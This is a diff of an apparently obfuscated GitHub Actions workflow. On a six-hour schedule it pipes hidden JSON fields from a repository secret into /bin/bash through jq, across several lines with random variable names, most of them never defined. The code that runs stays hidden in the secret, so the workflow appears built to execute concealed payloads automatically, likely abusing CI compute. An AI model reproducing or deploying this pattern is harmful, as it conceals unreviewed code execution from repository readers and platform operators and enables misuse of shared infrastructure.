@@ -3,23 +3,23 @@ name: hugouhuohuang
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 5/6 * * *'
+    - cron: '7 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: hugouhuohuang
         env:
-          zuv90: ${{ secrets.zuv90 }}
+          zd23: ${{ secrets.zd23 }}
         run: |
-          echo $zuv90 | jq -r .p406 | /bin/bash
-          echo $tx43775 | jq -r .a774 | /bin/bash
-          echo $xu704 | jq -r .rispt9746 | /bin/bash
-          echo $zjgud7 | jq -r .f6 | /bin/bash
-          echo $kieq89 | jq -r .xsmqi17 | /bin/bash
-          echo $guyj393 | jq -r .qzki47 | /bin/bash
-          echo $d2642 | jq -r .ay84597 | /bin/bash
-          echo $npp487 | jq -r .gzts47 | /bin/bash
-          echo $cemkm2997 | jq -r .k45 | /bin/bash
+          echo $zd23 | jq -r .duqax144 | /bin/bash
+          echo $rtns49916 | jq -r .by0888 | /bin/bash
+          echo $h662 | jq -r .jrfi017 | /bin/bash
+          echo $nzbm73 | jq -r .dfeo456 | /bin/bash
+          echo $jvizn5 | jq -r .sx9024 | /bin/bash
+          echo $yg2525 | jq -r .jew7 | /bin/bash
+          echo $a251 | jq -r .ku21 | /bin/bash
 
